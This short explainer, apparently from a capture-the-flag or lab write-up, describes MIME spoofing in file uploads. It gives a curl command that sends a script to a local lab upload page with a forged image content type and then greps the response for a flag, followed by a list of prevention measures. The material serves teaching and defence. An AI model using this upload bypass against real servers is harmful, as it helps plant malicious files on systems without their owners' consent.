# MIME Spoofing

MIME Spoofing occurs when an attacker uploads a malicious script disguised as a different file type, such as an image. For example, the following `curl` command uploads a malicious script while the server thinks it is an image:

```sh
curl -s -X POST \
    -F "uploaded=@./malicious_script.sh;type=image/jpeg" \
    -F "Upload=Upload" \
    "http://127.0.0.1:1080/index.php?page=upload" | grep 'flag'
```

## How to Prevent MIME Spoofing

To prevent MIME spoofing, it is essential to:

1. **Validate File Types:** Check the file's MIME type and extension to ensure it matches the expected type.
2. **Scan Uploaded Files:** Use antivirus or security software to scan uploaded files for malicious content.
3. **Restrict File Uploads:** Limit the types of files that can be uploaded to only those that are necessary.
4. **Use Security Libraries:** Utilize libraries and frameworks that provide built-in protection against file upload vulnerabilities.